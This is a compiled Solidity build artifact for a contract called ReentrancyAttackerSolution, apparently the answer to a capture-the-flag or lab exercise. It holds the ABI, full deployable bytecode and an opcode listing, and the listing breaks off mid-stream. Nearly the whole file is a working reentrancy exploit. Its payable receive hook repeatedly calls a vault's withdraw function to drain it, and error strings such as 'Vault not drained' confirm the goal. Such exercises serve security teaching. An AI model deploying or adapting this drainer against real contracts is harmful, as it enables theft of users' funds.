{"contracts/ReentrancyAttackerSolution.sol":{"ReentrancyAttackerSolution":{"abi":[{"inputs":[{"internalType":"address payable","name":"_vaultAddress","type":"address"}],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"bool","name":"success","type":"bool"}],"name":"AttackCompleted","type":"event"},{"anonymous":false,"inputs":[],"name":"AttackStarted","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint256","name":"counter","type":"uint256"}],"name":"ReentryCalled","type":"event"},{"inputs":[],"name":"attack","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"attackCounter","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getFlag","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"vault","outputs":[{"internalType":"contract IReentrancyVulnerableVault","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"stateMutability":"payable","type":"receive"}],"evm":{"bytecode":{"linkReferences":{},"object":"60a060405234801561001057600080fd5b50604051610da2380380610da2833981810160405281019061003291906100cf565b8073ffffffffffffffffffffffffffffffffffffffff1660808173ffffffffffffffffffffffffffffffffffffffff1681525050506100fc565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061009c82610071565b9050919050565b6100ac81610091565b81146100b757600080fd5b50565b6000815190506100c9816100a3565b92915050565b6000602082840312156100e5576100e461006c565b5b60006100f3848285016100ba565b91505092915050565b608051610c5b6101476000396000818160a5015281816101fd0152818161027f0152818161036d01528181610402015281816104d00152818161059e01526106370152610c5b6000f3fe6080604052600436106100435760003560e01c80632631a7c61461013e5780639e5faafc14610169578063f963393014610173578063fbfa77cf1461019e57610139565b36610139577fec04698b902017d19b5a850389ce306028ca8286c87892515039cee89c7f80f36000546040516100799190610672565b60405180910390a1600260005410156101375760008081548092919061009e906106bc565b91905055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016101049190610749565b600060405180830381600087803b15801561011e57600080fd5b505af1158015610132573d6000803e3d6000fd5b505050505b005b600080fd5b34801561014a57600080fd5b506101536101c9565b6040516101609190610672565b60405180910390f35b6101716101cf565b005b34801561017f57600080fd5b506101886104cc565b60405161019591906107f4565b60405180910390f35b3480156101aa57600080fd5b506101b3610635565b6040516101c0919061088b565b60405180910390f35b60005481565b7f64bbaf32eb390bd386c9d4d90009bbdc843f6f400f852cf591a4749ff5f4610a60405160405180910390a17f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663d0e30db06040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561026357600080fd5b505af1158015610277573d6000803e3d6000fd5b5050505060007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff166370a08231306040518263ffffffff1660e01b81526004016102d691906108c7565b602060405180830381865afa1580156102f3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906103179190610922565b9050670de0b6b3a7640000811015610364576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161035b9061099b565b60405180910390fd5b600080819055507f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff16632e1a7d4d670de0b6b3a76400006040518263ffffffff1660e01b81526004016103cc9190610749565b600060405180830381600087803b1580156103e657600080fd5b505af11580156103fa573d6000803e3d6000fd5b5050505060007f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663b68246036040518163ffffffff1660e01b8152600401602060405180830381865afa15801561046b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061048f91906109f3565b90507f7618b69267d2ee8b650d77516e7542e4383f89c018beb0ded2bd6b539a219609816040516104c09190610a2f565b60405180910390a15050565b60607f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663b68246036040518163ffffffff1660e01b8152600401602060405180830381865afa158015610539573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019061055d91906109f3565b61059c576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161059390610a96565b60405180910390fd5b7f000000000000000000000000000000000000000000000000000000000000000073ffffffffffffffffffffffffffffffffffffffff1663f96339306040518163ffffffff1660e01b8152600401600060405180830381865afa158015610607573d6000803e3d6000fd5b505050506040513d6000823e3d601f19601f820116820180604052508101906106309190610bdc565b905090565b7f000000000000000000000000000000000000000000000000000000000000000081565b6000819050919050565b61066c81610659565b82525050565b60006020820190506106876000830184610663565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052601160045260246000fd5b60006106c782610659565b91507fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82036106f9576106f861068d565b5b600182019050919050565b6000819050919050565b6000819050919050565b600061073361072e61072984610704565b61070e565b610659565b9050919050565b61074381610718565b82525050565b600060208201905061075e600083018461073a565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561079e578082015181840152602081019050610783565b60008484015250505050565b6000601f19601f8301169050919050565b60006107c682610764565b6107d0818561076f565b93506107e0818560208601610780565b6107e9816107aa565b840191505092915050565b6000602082019050818103600083015261080e81846107bb565b905092915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061085161084c61084784610816565b61070e565b610816565b9050919050565b600061086382610836565b9050919050565b600061087582610858565b9050919050565b6108858161086a565b82525050565b60006020820190506108a0600083018461087c565b92915050565b60006108b182610816565b9050919050565b6108c1816108a6565b82525050565b60006020820190506108dc60008301846108b8565b92915050565b6000604051905090565b600080fd5b600080fd5b6108ff81610659565b811461090a57600080fd5b50565b60008151905061091c816108f6565b92915050565b600060208284031215610938576109376108ec565b5b60006109468482850161090d565b91505092915050565b7f4465706f736974206661696c6564000000000000000000000000000000000000600082015250565b6000610985600e8361076f565b91506109908261094f565b602082019050919050565b600060208201905081810360008301526109b481610978565b9050919050565b60008115159050919050565b6109d0816109bb565b81146109db57600080fd5b50565b6000815190506109ed816109c7565b92915050565b600060208284031215610a0957610a086108ec565b5b6000610a17848285016109de565b91505092915050565b610a29816109bb565b82525050565b6000602082019050610a446000830184610a20565b92915050565b7f5661756c74206e6f7420647261696e6564000000000000000000000000000000600082015250565b6000610a8060118361076f565b9150610a8b82610a4a565b602082019050919050565b60006020820190508181036000830152610aaf81610a73565b9050919050565b600080fd5b600080fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b610af8826107aa565b810181811067ffffffffffffffff82111715610b1757610b16610ac0565b5b80604052505050565b6000610b2a6108e2565b9050610b368282610aef565b919050565b600067ffffffffffffffff821115610b5657610b55610ac0565b5b610b5f826107aa565b9050602081019050919050565b6000610b7f610b7a84610b3b565b610b20565b905082815260208101848484011115610b9b57610b9a610abb565b5b610ba6848285610780565b509392505050565b600082601f830112610bc357610bc2610ab6565b5b8151610bd3848260208601610b6c565b91505092915050565b600060208284031215610bf257610bf16108ec565b5b600082015167ffffffffffffffff811115610c1057610c0f6108f1565b5b610c1c84828501610bae565b9150509291505056fea26469706673582212201447853c33ffa51e2b97967743283852d637485a8e6f1d27c764920ce81db13264736f6c63430008140033","opcodes":"PUSH1 0xA0 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0x10 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xDA2 CODESIZE SUB DUP1 PUSH2 0xDA2 DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x32 SWAP2 SWAP1 PUSH2 0xCF JUMP JUMPDEST DUP1 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x80 DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE POP POP POP PUSH2 0xFC JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x9C DUP3 PUSH2 0x71 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xAC DUP2 PUSH2 0x91 JUMP JUMPDEST DUP2 EQ PUSH2 0xB7 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xC9 DUP2 PUSH2 0xA3 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xE5 JUMPI PUSH2 0xE4 PUSH2 0x6C JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF3 DUP5 DUP3 DUP6 ADD PUSH2 0xBA JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x80 MLOAD PUSH2 0xC5B PUSH2 0x147 PUSH1 0x0 CODECOPY PUSH1 0x0 DUP2 DUP2 PUSH1 0xA5 ADD MSTORE DUP2 DUP2 PUSH2 0x1FD ADD MSTORE DUP2 DUP2 PUSH2 0x27F ADD MSTORE DUP2 DUP2 PUSH2 0x36D ADD MSTORE DUP2 DUP2 PUSH2 0x402 ADD MSTORE DUP2 DUP2 PUSH2 0x4D0 ADD MSTORE DUP2 DUP2 PUSH2 0x59E ADD MSTORE PUSH2 0x637 ADD MSTORE PUSH2 0xC5B PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x4 CALLDATASIZE LT PUSH2 0x43 JUMPI PUSH1 0x0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x2631A7C6 EQ PUSH2 0x13E JUMPI DUP1 PUSH4 0x9E5FAAFC EQ PUSH2 0x169 JUMPI DUP1 PUSH4 0xF9633930 EQ PUSH2 0x173 JUMPI DUP1 PUSH4 0xFBFA77CF EQ PUSH2 0x19E JUMPI PUSH2 0x139 JUMP JUMPDEST CALLDATASIZE PUSH2 0x139 JUMPI PUSH32 0xEC04698B902017D19B5A850389CE306028CA8286C87892515039CEE89C7F80F3 PUSH1 0x0 SLOAD PUSH1 0x40 MLOAD PUSH2 0x79 SWAP2 SWAP1 PUSH2 0x672 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH1 0x2 PUSH1 0x0 SLOAD LT ISZERO PUSH2 0x137 JUMPI PUSH1 0x0 DUP1 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH2 0x9E SWAP1 PUSH2 0x6BC JUMP JUMPDEST SWAP2 SWAP1 POP SSTORE POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x104 SWAP2 SWAP1 PUSH2 0x749 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x11E JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x132 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP JUMPDEST STOP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x14A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x153 PUSH2 0x1C9 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x160 SWAP2 SWAP1 PUSH2 0x672 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x171 PUSH2 0x1CF JUMP JUMPDEST STOP JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x17F JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x188 PUSH2 0x4CC JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x195 SWAP2 SWAP1 PUSH2 0x7F4 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST CALLVALUE DUP1 ISZERO PUSH2 0x1AA JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH2 0x1B3 PUSH2 0x635 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x1C0 SWAP2 SWAP1 PUSH2 0x88B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x0 SLOAD DUP2 JUMP JUMPDEST PUSH32 0x64BBAF32EB390BD386C9D4D90009BBDC843F6F400F852CF591A4749FF5F4610A PUSH1 0x40 MLOAD PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xD0E30DB0 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x263 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x277 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x70A08231 ADDRESS PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x2D6 SWAP2 SWAP1 PUSH2 0x8C7 JUMP JUMPDEST PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x2F3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x317 SWAP2 SWAP1 PUSH2 0x922 JUMP JUMPDEST SWAP1 POP PUSH8 0xDE0B6B3A7640000 DUP2 LT ISZERO PUSH2 0x364 JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x35B SWAP1 PUSH2 0x99B JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x0 DUP1 DUP2 SWAP1 SSTORE POP PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x2E1A7D4D PUSH8 0xDE0B6B3A7640000 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3CC SWAP2 SWAP1 PUSH2 0x749 JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x3E6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x3FA JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x0 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB6824603 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x46B JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x48F SWAP2 SWAP1 PUSH2 0x9F3 JUMP JUMPDEST SWAP1 POP PUSH32 0x7618B69267D2EE8B650D77516E7542E4383F89C018BEB0DED2BD6B539A219609 DUP2 PUSH1 0x40 MLOAD PUSH2 0x4C0 SWAP2 SWAP1 PUSH2 0xA2F JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 LOG1 POP POP JUMP JUMPDEST PUSH1 0x60 PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xB6824603 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x539 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x55D SWAP2 SWAP1 PUSH2 0x9F3 JUMP JUMPDEST PUSH2 0x59C JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x593 SWAP1 PUSH2 0xA96 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH32 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xF9633930 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 GAS STATICCALL ISZERO DUP1 ISZERO PUSH2 0x607 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE PUSH1 0x0 DUP3 RETURNDATACOPY RETURNDATASIZE PUSH1 0x1F NOT PUSH1 0x1F DUP3 ADD AND DUP3 ADD DUP1 PUSH1 0x40 MSTORE POP DUP2 ADD SWAP1 PUSH2 0x630 SWAP2 SWAP1 PUSH2 0xBDC JUMP JUMPDEST SWAP1 POP SWAP1 JUMP JUMPDEST PUSH32 0x0 DUP2 JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x66C DUP2 PUSH2 0x659 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x687 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x663 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x11 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH2 0x6C7 DUP3 PUSH2 0x659 JUMP JUMPDEST SWAP2 POP PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 SUB PUSH2 0x6F9 JUMPI PUSH2 0x6F8 PUSH2 0x68D JUMP JUMPDEST JUMPDEST PUSH1 0x1 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x733 PUSH2 0x72E PUSH2 0x729 DUP5 PUSH2 0x704 JUMP JUMPDEST PUSH2 0x70E JUMP JUMPDEST PUSH2 0x659 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x743 DUP2 PUSH2 0x718 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x75E PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x73A JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x79E JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x783 JUMP JUMPDEST PUSH1 0x0 DUP5 DUP5 ADD MSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1F NOT PUSH1 0x1F DUP4 ADD AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x7C6 DUP3 PUSH2 0x764 JUMP JUMPDEST PUSH2 0x7D0 DUP2 DUP6 PUSH2 0x76F JUMP JUMPDEST SWAP4 POP PUSH2 0x7E0 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x780 JUMP JUMPDEST PUSH2 0x7E9 DUP2 PUSH2 0x7AA JUMP JUMPDEST DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x80E DUP2 DUP5 PUSH2 0x7BB JUMP JUMPDEST SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x851 PUSH2 0x84C PUSH2 0x847 DUP5 PUSH2 0x816 JUMP JUMPDEST PUSH2 0x70E JUMP JUMPDEST PUSH2 0x816 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x863 DUP3 PUSH2 0x836 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x875 DUP3 PUSH2 0x858 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x885 DUP2 PUSH2 0x86A JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x8A0 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x87C JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x8B1 DUP3 PUSH2 0x816 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x8C1 DUP2 PUSH2 0x8A6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x8DC PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x8B8 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD SWAP1 POP SWAP1 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH2 0x8FF DUP2 PUSH2 0x659 JUMP JUMPDEST DUP2 EQ PUSH2 0x90A JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x91C DUP2 PUSH2 0x8F6 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x938 JUMPI PUSH2 0x937 PUSH2 0x8EC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0x946 DUP5 DUP3 DUP6 ADD PUSH2 0x90D JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x4465706F736974206661696C6564000000000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x985 PUSH1 0xE DUP4 PUSH2 0x76F JUMP JUMPDEST SWAP2 POP PUSH2 0x990 DUP3 PUSH2 0x94F JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0x9B4 DUP2 PUSH2 0x978 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 ISZERO ISZERO SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x9D0 DUP2 PUSH2 0x9BB JUMP JUMPDEST DUP2 EQ PUSH2 0x9DB JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0x9ED DUP2 PUSH2 0x9C7 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xA09 JUMPI PUSH2 0xA08 PUSH2 0x8EC JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xA17 DUP5 DUP3 DUP6 ADD PUSH2 0x9DE JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0xA29 DUP2 PUSH2 0x9BB JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0xA44 PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0xA20 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH32 0x5661756C74206E6F7420647261696E6564000000000000000000000000000000 PUSH1 0x0 DUP3 ADD MSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA80 PUSH1 0x11 DUP4 PUSH2 0x76F JUMP JUMPDEST SWAP2 POP PUSH2 0xA8B DUP3 PUSH2 0xA4A JUMP JUMPDEST PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP DUP2 DUP2 SUB PUSH1 0x0 DUP4 ADD MSTORE PUSH2 0xAAF DUP2 PUSH2 0xA73 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH2 0xAF8 DUP3 PUSH2 0x7AA JUMP JUMPDEST DUP2 ADD DUP2 DUP2 LT PUSH8 0xFFFFFFFFFFFFFFFF DUP3 GT OR ISZERO PUSH2 0xB17 JUMPI PUSH2 0xB16 PUSH2 0xAC0 JUMP 